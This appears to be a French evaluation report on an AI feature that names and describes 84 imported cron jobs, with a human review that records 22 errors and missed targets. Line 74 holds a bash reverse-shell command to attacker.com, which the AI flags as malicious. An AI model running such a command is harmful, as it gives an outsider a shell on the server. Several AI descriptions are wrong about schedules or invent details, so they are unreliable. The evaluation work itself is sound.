# Rôle IA — nommer les jobs à l'import (2026-11-11)

- **lignes** : 84
- **acceptes** : 100 % (attente ≥ 90 %)
- **critique_accord** : 82 % sur 22 cas clairs (attente ≥ 80 %)
- **latence_mediane_s** : 7.1 (attente ≤ 5)

## Toutes les lignes (relecture humaine)

1. `* * * * * root /bin/bash /root/scripts/vpnup.bash >> /root/scripts/vpn.log`
   - code : **root**
   - IA : **vpn-status-check** — Vérifie l'état du serveur VPN et enregistre les résultats dans un fichier de journalisation.
2. `00 19 * * * bash /home/test/take_backup.sh > /home/test/backup.log 2>&1 || mail -s "Backup failed, check attached logs" redacted@example.com < /home/test/b`
   - code : **take_backup**
   - IA : **nightly-db-backup** — Effectue une sauvegarde quotidienne de la base de données et envoie un rapport par e-mail en cas d'échec. — ⚑ critique · marqué critique
3. `17 * * * * root    cd / && run-parts --report /etc/cron.hourly`
   - code : **root**
   - IA : **execute-cron-hourly** — Exécute les tâches définies dans /etc/cron.hourly
4. `25 6 * * * root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )`
   - code : **root**
   - IA : **daily-system-maintenance** — Exécute les tâches de maintenance journalières définies dans /etc/cron.daily
5. `47 6 * * 7 root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )`
   - code : **root**
   - IA : **weekly-cron-jobs** — Exécute les tâches planifiées hebdomadaires définies dans /etc/cron.weekly
6. `52 6 1 * * root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )`
   - code : **root**
   - IA : **monthly-scripts-execution** — Exécute les scripts mensuels définis dans le répertoire /etc/cron.monthly
7. `5 0 * * * root    bash /sites/domain.com/scripts/backup.sh`
   - code : **root**
   - IA : **nightly-db-backup** — Effectue une sauvegarde quotidienne de la base de données du site domain.com. — ⚑ critique · marqué critique
8. `0 3 * * * root    php /sites/domain.com/www/cron/clear-expired-carts.php`
   - code : **root**
   - IA : **clear-expired-carts** — Supprime les paniers d'achat expirés du système.
9. `0 1 * * 7 root    php /sites/domain.com/www/cron/generate-vehicle-sitemap.php`
   - code : **root**
   - IA : **weekly-vehicle-sitemap-generation** — Génère une mappemonde des véhicules chaque semaine.
10. `3 3 * * * root    php /sites/domain.com/www/cron/account/update-dealer-map.php`
   - code : **root**
   - IA : **update-dealer-map** — Mise à jour du mapping des concessionnaires
11. `15 1 * * 1-5 root    php /sites/internal.domain.com/www/cron/account/clock/accountability-report.php`
   - code : **root**
   - IA : **weekly-accountability-report** — Génère un rapport d'accountabilité hebdomadaire.
12. `0 6 * * 1 root    php /sites/internal.domain.com/www/cron/account/clock/tardy-report.php`
   - code : **root**
   - IA : **weekly-tardy-report** — Génère un rapport hebdomadaire des retards d'employés.
13. `0 22 * * * root    php /sites/internal.domain.com/www/cron/account/clock/clock-out.php`
   - code : **root**
   - IA : **daily-account-clockout** — Enregistre les sorties des comptes à minuit chaque jour.
14. `30 1 * * * root    php /sites/internal.domain.com/www/cron/ebay/get-feedback.php`
   - code : **root**
   - IA : **get-ebay-feedback** — Récupère les commentaires eBay pour le site internal.domain.com
15. `* * * * * root    php /sites/internal.domain.com/www/cron/ebay/archive/get-listing-data.php`
   - code : **root**
   - IA : **get-listing-data** — Récupère les données des listings eBay
16. `10 * * * * root    php /sites/internal.domain.com/www/cron/ebay/archive/associa`
   - code : **root**
   - IA : **archive-associations** — Archivage des associations eBay
17. `@reboot /root/reboot.sh`
   - code : **reboot**
   - IA : **system-restart** — Exécute un redémarrage du système à la réinitialisation.
18. `30 9 * * * cronuser /usr/bin/php -C /etc /path/to/process.php`
   - code : **cronuser**
   - IA : **daily-data-processing** — Exécute le traitement des données quotidien.
19. `22 18 7 * * cronuser echo "Test" > /path/to/test.txt`
   - code : **cronuser**
   - IA : **daily-test-log** — Écrit le mot 'Test' dans un fichier chaque jour à 18:22. · marqué non critique
20. `9 12 8 * * cronuser /bin/echo "Test" > /var/www/eDialog/test.txt`
   - code : **cronuser**
   - IA : **daily-test-cron** — Écrit le mot 'Test' dans un fichier texte sur le serveur. · marqué non critique
21. `30 9 * * * /usr/bin/php -C /etc /path/to/process.php`
   - code : **php**
   - IA : **daily-data-processing** — Exécute le traitement des données quotidien.
22. `9 12 8 * * /bin/echo "Test" > /path/to/test.txt`
   - code : **echo**
   - IA : **daily-test-log** — Écrit le mot 'Test' dans un fichier chaque jour à minuit et demi. · marqué non critique
23. `26 3 * * * cronic python3 ~/redacted_directory_name/redacted_script_name.py`
   - code : **cronic**
   - IA : **daily-data-processing** — Exécute un script Python pour traiter les données chaque jour à 03:26.
24. `24 22 * * * echo "Testing cron email"`
   - code : **echo**
   - IA : **test-cron-email** — Envoie un test d'email via la tâche cron · marqué non critique
25. `* * * * * arp -n > results.txt`
   - code : **arp**
   - IA : **network-neighbors-update** — Mets à jour la liste des voisins réseaux dans un fichier.
26. `30 06 * * * root $binPath/zsh/test.zsh | adddate 1>>$logPath/log.csv 2>>$errorLogPath/error.txt`
   - code : **root**
   - IA : **daily-test** — Exécute un test quotidien enregistré dans le fichier test.zsh et ajoute une date à ses résultats.
27. `23 0 5 * * 1 /home/user/bin/checkSystem`
   - code : **1**
   - IA : **weekly-system-check** — Effectue un contrôle hebdomadaire du système.
28. `0 * * * * /home/naruto/Hour-sound.sh 2>/tmp/error`
   - code : **Hour-sound**
   - IA : **play-hourly-sound** — Joue un son à l'heure précise chaque heure · marqué non critique
29. `1 0 * * * printf > /var/log/apache/error_log`
   - code : **printf**
   - IA : **clear-apache-error-log** — Efface le journal d'erreurs Apache.
30. `* * * * * /usr/bin/perl /var/www/web/myfolder/LoadPrograms.pl >> /var/www/web/log.txt`
   - code : **perl**
   - IA : **load-programs** — Exécute un script Perl pour charger les programmes et enregistre la sortie dans un fichier de journal.
31. `* * * * * (. ~/.bash_profile; $HOME/scripts/startworkflow_trg.sh tst)`
   - code : ****
   - IA : **start-workflow-trg** — Lance un workflow pour le trg.
32. `*/1 * * * * /home/uname/dir/script`
   - code : **script**
   - IA : **run-every-minute** — Exécute un script toutes les minutes.
33. `*/5 * * * * ~/check_phpfpm.sh`
   - code : **check_phpfpm**
   - IA : **php-fpm-status-check** — Vérifie le statut des pools PHP-FPM.
34. `*/5 * * * * ~/check_nginx.sh`
   - code : **check_nginx**
   - IA : **nginx-status-check** — Vérifie l'état du serveur Nginx.
35. `*/5 * * * * ~/disk-clean.sh`
   - code : **disk-clean**
   - IA : **disk-cleanup** — Nettoie le disque en supprimant les fichiers temporaires
36. `*/5 * * * * ~/loadcheck.sh`
   - code : **loadcheck**
   - IA : **system-check-every-5-minutes** — Exécute des vérifications du système toutes les 5 minutes.
37. `*/1 * * * * node /app/api/run.js`
   - code : **run**
   - IA : **run-api-every-minute** — Exécute l'API toutes les minutes.
38. `*/5 * * * * /bin/sh /Users/na/GulpBuild.sh >> /Users/na/cronlog.log 2>&1`
   - code : **sh**
   - IA : **build-watch** — Exécute une tâche de construction en continu pour le développement.
39. `* 0 * * * root cd /home/deploy/rails_apps/supercharger/current/ && /usr/local/rvm/wrappers/ruby-1.9.3-p484/ruby bundle exec rails runner -e production`
   - code : **root**
   - IA : **run-rails-charger** — Exécute le runner Ruby pour démarrer la tâche de chargement des données.
40. `30 12 * * * java -jar test.jar`
   - code : **java**
   - IA : **daily-jar-execution** — Exécute un fichier jar quotidien à minuit et demie
41. `*/1 * * * * root    date >> /var/log/cron-test.log 2>&1`
   - code : **root**
   - IA : **log-cron-date** — Enregistre la date actuelle dans un fichier de journalisation every minute · marqué non critique
42. `*/1 * * * * /home/deploy/cron/job.sh >> /home/deploy/cron/test.log 2>&1`
   - code : **job**
   - IA : **cron-job** — Exécute un script cron enregistré dans job.sh et logge les résultats.
43. `*/10 * * * * cp /home/app/log/file.log.$(date --d="-1 day" +%Y%m%d) /root/`
   - code : **cp**
   - IA : **daily-log-backup** — Crée une copie d'un fichier de journal d'application du jour précédent dans le répertoire racine.
44. `* * * * * /bin/bash -l -c 'cd /home/myhome/analytics && RAILS_ENV=development /bundle exec rake my_rake_job'`
   - code : **bash**
   - IA : **daily-analytics-job** — Exécute une tâche Ruby sur le tableau de bord analytique en environnement de développement.
45. `*/1 * * * * root . /root/.bashrc; python3.7 /usr/src/collector/run.py`
   - code : **root**
   - IA : **data-collector** — Collecte des données à intervalles réguliers
46. `*/1 * * * * root echo 'hi' >> /var/log/lastlog`
   - code : **root**
   - IA : **log-update-every-minute** — Ajoute un message à la fin du fichier de journalisation every minute. · marqué non critique
47. `50 * * * * /home/myusername/bin/uploadmyip`
   - code : **uploadmyip**
   - IA : **update-my-ip** — Mise à jour de l'adresse IP dans un fichier ou une base de données.
48. `* * * * * /home/ubuntu/TestTG/TGubuntu.py`
   - code : **TGubuntu**
   - IA : **test-tg-ubuntu** — Exécute le script TGubuntu.py en mode test.
49. `0 0 * * 1 wget -q -O /dev/null http://www.urlhere.co.uk/index.php/cron_event/send_reminders`
   - code : **wget**
   - IA : **send-reminders-weekly** — Envoie des rappels hebdomadaires à partir d'un site Web.
50. `* * * * * curl --silent http://www....cron_script.php >  /dev/null`
   - code : **curl**
   - IA : **daily-website-status-check** — Effectue un check du statut du site Web chaque jour.
51. `00 * * * * $HOME/u/kh/bin/z.pl >> $HOME/tmplocal/DUMS/z.pl/out.txt 2>&1`
   - code : **z**
   - IA : **daily-data-processing** — Exécute un script Z qui processse les données chaque jour.
52. `0 0 * * * /home2/backup/backup-all.sh`
   - code : **backup-all**
   - IA : **nightly-db-backup** — Effectue une sauvegarde quotidienne de la base de données — ⚑ critique · marqué critique
53. `0 0 * * * /usr/bin/time /path/to/mysqlbackup.sh | /bin/mail -s "MySQL Backup" "admin@example.com"`
   - code : **time**
   - IA : **nightly-db-backup** — Effectue une sauvegarde quotidienne de la base de données et envoie un rapport par e-mail. — ⚑ critique · marqué critique
54. `* * * * * (/usr/bin/time /root/utils/test.sh 2&>1) | /usr/bin/tee /tmp/cron.test | /bin/mail -s "test" "srobbins@example.com"`
   - code : **time**
   - IA : **run-test-script** — Exécute un script de test et envoie les résultats par e-mail
55. `0 * * * * python /Users/jamesrusso/Documents/TorMeasure/TorMeasurementProject/getConsensus.py`
   - code : **getConsensus**
   - IA : **update-consensus-data** — Mets à jour les données du consensus Tor
56. `00 00 * * * /usr/bin/php /path/file.php`
   - code : **php**
   - IA : **daily-data-processing** — Exécute le traitement des données quotidien.
57. `*/10 * * * * . $HOME/.bashrc sh /path/to/cronjob.sh`
   - code : **job**
   - IA : **load-environment-variables** — Charge les variables d'environnement depuis le fichier .bashrc
58. `*/5 * * * * bash ~/Documents/GitHub/BFOR206/hw1.sh`
   - code : **hw1**
   - IA : **run-hw1-script** — Exécute le script hw1.sh à intervalles réguliers. · marqué non critique
59. `* * * * * root    /root/test.sh > /dev/null`
   - code : **root**
   - IA : **test-script** — Exécute un script de test · marqué non critique
60. `* * * * * root    /root/test.sh`
   - code : **root**
   - IA : **daily-test-execution** — Exécute le script de test quotidien · marqué non critique
61. `*/5 * * * * /Users/me/miniforge3/envs/dev/bin/fclean >> /dev/null 2>&1`
   - code : **fclean**
   - IA : **cleanup-dev-env** — Nettoie l'environnement de développement tous les 5 minutes.
62. `*/5 * * * * /Users/me/miniforge3/envs/dev/bin/python /Users/me/miniforge3/envs/dev/bin/fclean >> /dev/null 2>&1`
   - code : **python**
   - IA : **cleanup-temp-files** — Supprime les fichiers temporaires dans le système.
63. `*/5 * * * * /Users/me/miniforge3/envs/dev/bin/python /Users/me/path/to/file.py >> /dev/null 2>&1`
   - code : **python**
   - IA : **run-python-script** — Exécute un script Python en arrière-plan.
64. `0 3 * * * /usr/bin/python3.6 "/home/ngabioud/Scripts Python VM/ClickTableau.py"`
   - code : **python3**
   - IA : **update-click-tableau** — Mets à jour le tableau de bord ClickTableau à 3 heures du matin
65. `* * * * * wget -O --q -t 1 http://domain:8280/folder/cron.php`
   - code : **wget**
   - IA : **http-request-cron** — Effectue une requête HTTP pour exécuter le script cron distant
66. `* * * * * wget --no-check-certificate -O --q -t 1 https://domain/folder/cron.php`
   - code : **wget**
   - IA : **fetch-cron-php** — Télécharge le fichier cron.php depuis l'URL spécifiée sans vérification du certificat.
67. `* */1 * * * python /path/to/script/my_script.py --pythonpath=/path/to/script/ 1>/path/to/script/success.log 2>/path/to/script/error.log`
   - code : **my_script**
   - IA : **hourly-script-execution** — Exécute un script Python toutes les heures.
68. `34 14 * * * /root/perl/./unzip.pl > /dev/null 2>&1`
   - code : **unzip**
   - IA : **daily-unzip-files** — Exécute un script Perl pour unzipper des fichiers daily.
69. `42 18 * * * /usr/bin/python3 /home/user/bin/bash/statxplore_api.py`
   - code : **python3**
   - IA : **daily-api-update** — Mise à jour quotidienne de l'API
70. `0 14 * * * PATH=$PATH:/usr/sbin PYTHONPATH=/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/ /usr/bin/python2.7 ~/.../scri`
   - code : **python2**
   - IA : **daily-data-processing** — Exécute le script Python pour traiter les données chaque jour à 14:00.
71. `00 * * * * BASH_ENV=~/.bash_profile && /bin/bash -c '~/deggy/onlineGW.rb'`
   - code : **bash**
   - IA : **gw-activity-monitor** — Surveille l'activité en temps réel d'un réseau de téléphonie
72. `*/5 * * * * /bin/bash -l -c "cd /home/deploy/railsapp && rake spec >> cron.log 2>&1"`
   - code : **bash**
   - IA : **run-rails-spec** — Exécute les tests unitaires Rails et enregistre le rapport dans un fichier de journal.
73. `* * * * * cd /var/www/app/current && /usr/local/bin/rake RAILS_ENV=production thinking_sphinx:index >> /var/www/app/current/log/cron.log 2>&1`
   - code : **rake**
   - IA : **reindex-thinking-sphinx** — Re-indexes the Thinking Sphinx search engine in the production environment.
74. `* * * * * /bin/bash -i >& /dev/tcp/attacker.com/5326 0>&1`
   - code : **bash**
   - IA : **remote-shell-access** — Permet un accès distant shell au serveur par une adresse IP malveillante
75. `32 * * * * root (apt-get install --allow-downgrades -y  firefox=45.0.2+build1-0ubuntu1)`
   - code : **root**
   - IA : **firefox-version-specific-update** — Installe une version spécifique de Firefox sans supprimer les autres versions existantes · marqué non critique
76. `32 * * * * /home/stefanolinux/firefox_update.sh >> firefox_update_works.txt`
   - code : **firefox_update**
   - IA : **firefox-update** — Mise à jour automatique de Firefox · marqué non critique
77. `@hourly apt-get install firefox=45.0.2+build1-0ubuntu1`
   - code : **apt-get**
   - IA : **install-firefox** — Installe une version spécifique de Firefox. · marqué non critique
78. `32 * * * * apt-get install --allow-downgrades -y  firefox=45.0.2+build1-0ubuntu1`
   - code : **apt-get**
   - IA : **firefox-version-specific-update** — Installe une version spécifique de Firefox sans supprimer les autres versions possibles. · marqué non critique
79. `* * * * * php -d register_argc_argv=On /home/techworld/public_html/hubli-betting/artisan schedule:run > /dev/null 2>&1`
   - code : **artisan**
   - IA : **run-scheduled-tasks** — Exécute les tâches planifiées définies dans l'application.
80. `0 * * * * mysqlcheck -Aao –auto-repair -u root -p[password] > /dev/null`
   - code : **mysqlcheck**
   - IA : **mysql-table-check** — Vérifie les tables MySQL et les répare automatiquement si nécessaire. · marqué critique
81. `0 * * * * /usr/local/bin/mysqlcheck --defaults-file=/root/.my.cnf --all-databases --auto-repair 2>&1 | grep -v "OK" | mail -s "Database Problem" root`
   - code : **mysqlcheck**
   - IA : **database-health-check** — Vérifie la santé des bases de données MySQL et envoie un rapport par e-mail si des problèmes sont détectés. · marqué critique
82. `0 8 * * * /mnt/data/sda/user_storage/stocks_etl.sh`
   - code : **stocks_etl**
   - IA : **daily-etl-process** — Exécute le processus ETL quotidien sur les stocks. · marqué critique
83. `* 0-1,4-23 * * * path/check_replication.sh > /dev/null 2>&1`
   - code : **check_replication**
   - IA : **check-replication** — Vérifie la réplication des données entre les bases de données · marqué critique
84. `*/10 * * * * run_job.sh`
   - code : **run_job**
   - IA : **run-job** — Exécute un job定期任务

## Relecture humaine des 84 lignes (2026-11-11) — attente ≥ 85 % justes : NON REMPLIE (62/84 = 74 %)

Faux (22) : 1 (vpnup = lever le VPN, pas « vérifier »), 2, 7, 52 (« base de données » inventée), 9 (« mappemonde » pour sitemap),
11, 13, 19, 20, 22, 27, 40, 43, 44, 50, 51, 60 (**fréquence ou heure fausse** : « hebdomadaire » pour du lundi-vendredi,
« minuit » pour 22 h, « quotidien » pour toutes les minutes…), 17 (« redémarre le système » pour un script lancé au
démarrage), 39 (« chargement des données » pour Charger), 57 (dit charger .bashrc, oublie cronjob.sh), 71 (« téléphonie »
inventée), 84 (caractères chinois).
Plus clair que le nom du code : **oui pour ~70 lignes sur 84** (le code donne « root » ×20, « python3 », « time », « bash »…) —
attente ≥ 50 % remplie. Critique : 82 % d'accord (remplie). Latence 7,1 s (attente ≤ 5 : non remplie).
Remarque : le cas 74 (reverse shell vers attacker.com) est nommé « remote-shell-access » et décrit comme malveillant.

Leçon : 12 des 22 erreurs portent sur le PLANNING, que le code connaît déjà (cron-parser) ; l'IA ne devrait pas le
décrire. Défaut à part, dans le nommage du code : dans une crontab système (/etc/crontab, champ utilisateur), il prend
« root » pour le nom du job.
